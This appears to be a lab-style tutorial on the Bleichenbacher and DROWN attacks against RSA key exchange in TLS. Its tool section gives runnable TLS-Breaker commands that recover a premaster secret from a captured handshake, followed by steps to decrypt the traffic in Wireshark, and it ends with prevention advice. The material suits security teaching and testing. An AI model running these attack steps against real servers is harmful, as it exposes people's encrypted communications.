# Bleichenbacher & DROWN

In addition to attacks targeting padding in symmetric encryption algorithms, there are also attacks that specifically target the asymmetric encryption algorithm RSA.

## Bleichenbacher Attack

Bleichenbacher attacks target RSA encryption combined with PKCS#1 padding. PKCS#1 padding is often used with RSA to ensure non-deterministic encryption, meaning that encrypting the same plaintext twice yields different ciphertexts by adding random padding before encryption.

This attack works by sending numerous adapted ciphertexts to a web server. The server decrypts these ciphertexts and checks the conformity of the PKCS#1 padding. If the server leaks information about whether the padding was valid, an attacker can deduce information about the original unmodified plaintext. By repeatedly performing these steps, an attacker can eventually gather enough information to fully reconstruct the plaintext.

In the context of TLS 1.2, Bleichenbacher attacks are effective only when a cipher suite utilizing RSA as the key exchange algorithm is chosen. Furthermore, a flaw in the web server that leaks padding validity (e.g., through verbose error messages or a timing side channel) is required. If these conditions are met, a Bleichenbacher attack can lead to the complete leakage of the session key, allowing an attacker to decrypt the entire communication.

## DROWN Attack

DROWN (Decrypting RSA with Obsolete and Weakened eNcryption) is a specific type of Bleichenbacher attack that exploits a vulnerability in SSL 2.0. To successfully execute this attack, an attacker needs to intercept a large number of connections. Subsequently, the attacker conducts a Bleichenbacher attack against an SSL 2.0 server using specially crafted handshake messages. SSL 2.0, intentionally designed with weak "export-grade" encryption algorithms to comply with government regulations in the 1990s, is particularly susceptible. Modern hardware has significantly improved, making it possible to break these weak encryption algorithms without extensive resources. Additionally, DROWN leverages bugs in old OpenSSL implementations to accelerate the decryption process.

However, DROWN specifically targets SSL 2.0, which has been deprecated for a long time. While web servers should no longer support SSL 2.0, encountering an improperly configured server with SSL 2.0 enabled can still occur during real-world engagements.

## Tools & Prevention

To execute a Bleichenbacher attack, you first need to install TLS-Breaker:

```bash
sudo apt install maven
git clone https://github.com/tls-attacker/TLS-Breaker
cd TLS-Breaker/
mvn clean install -DskipTests=true
```

Verify your Java installation as TLS-Breaker requires JDK 11 (e.g., `/usr/lib/jvm/java-1.11.0-openjdk-amd64`):

```bash
update-java-alternatives --list
```

Once TLS-Breaker is set up, you can run the Bleichenbacher detection tool against a target server. If you have captured TLS traffic in a pcap file, you can extract the encrypted premaster secret from the `Client Key Exchange` packet in Wireshark. After obtaining the encrypted premaster secret, you can feed it to the `bleichenbacher-1.0.1.jar` tool using the `-encrypted_premaster_secret` option:

```bash
/usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -jar apps/bleichenbacher-1.0.1.jar -executeAttack -connect STMIP:STMPO -encrypted_premaster_secret a3670d3a2635d0bd058f7b3e838bd45db2af554f69f66345232960ad98392faaf2e873f818b18c85d0c4cc332b20e30ebe230f0cd77674d62d49cc90857d7695d41f9589546d7eb0ad34ac9c7fd3eafaa2967db2dcab25680185e9f129a637a3024df61f009cb8c1d0394fdf758bdf4becf04685533186cbaf503917cb0fbf88841d8497bef6af3c4e6ae2c8ed01cc1727a4356734aafb811771dcd17842e118e706c67c53f16b9268afd0183e2ba449985bc6d78bbc728591a4bafb4280c58102c90809fb0550e7d1700c795eb615238a80f466547711416c2b154fb1ee2c4cb3b97b956a01871a4753856cdafe8ef31a539fb87c98095e2c7a3aae990c3953
```

The tool will output the padded premaster secret. You can then remove the padding to obtain the unpadded premaster secret by stripping everything up to the TLS version (e.g., `0303` for TLS 1.2 in hex) using a command like:

```bash
echo -n 2c3abf8d54312e42446364d8e59bd1236aec1f62ccffffa2ca06555cd49a55d295947a13c5eb288625cb10894fe275b43619cf829422849ca605e1a4247afdf6777125466fb11912af099e9dc4574930602f1364440d6eb4fdad465eee14143a642b64d4116b40cfcb8db202d2ba8668038ce2f2068cf06ce8d1f23ac294c3b029c36041624f2b02a9a434144b01bf4e389b4e7484efb68c058d4240673ee6bd19fb5f80c3d08486b888cfa8235d5f2e1ab4cae3d266533b990c6abbcbeea25b60c8dbe5db4af3790d75b67956e00030346e31fe27a7ef62f88826f00d95c3e8665d8ac719614369543b077ecac37c112e1313cfa8ecf9fb86c29ed89abc4 | awk -F '0303' '{print "\n0303"$2}'
```

After obtaining the premaster secret and the client's random nonce (found in the `ClientHello` message in Wireshark), a key file can be created with the format `PMS_CLIENT_RANDOM <client_random> <premaster_secret>`. This key file can then be used in Wireshark to decrypt the TLS traffic.

**Prevention:**

DROWN can be prevented by disabling SSL 2.0. Most modern operating systems' cryptographic libraries do not support SSL 2.0 by default, making DROWN vulnerabilities rare in the wild. Bleichenbacher attacks can be prevented by ensuring that padding information is not revealed to the TLS client. Keeping web servers up-to-date with patches is sufficient to protect against plain Bleichenbacher attacks.

### Decrypting Traffic with Wireshark

After obtaining the premaster secret (e.g., `030346e31fe27a7ef62f88826f00d95c3e8665d8ac719614369543b077ecac37c112e1313cfa8ecf9fb86c29ed89abc4`) and the client's random key (e.g., `9443e40e20140ebf9e3c83f268f73f8de9c564f9eb493c8f6ad7bfe1ddf672bc`, found in the `ClientHello` packet in Wireshark's `Random` field), you can decrypt captured TLS traffic. Create a key file with the format `PMS_CLIENT_RANDOM <CLIENT_RANDOM> <PREMASTER_SECRET>`:

```bash
cat << EOF > KeyFile
PMS_CLIENT_RANDOM 9443e40e20140ebf9e3c83f268f73f8de9c564f9eb493c8f6ad7bfe1ddf672bc 030346e31fe27a7ef62f88826f00d95c3e8665d8ac719614369543b077ecac37c112e1313cfa8ecf9fb86c29ed89abc4
EOF
```

Then, import this key file into Wireshark by navigating to `Edit -> Preferences -> Protocols -> TLS` and specifying the path to your `KeyFile` under `(Pre)-Master-Secret log filename`. This will decrypt the TLS packets, allowing you to inspect the original HTTP traffic.
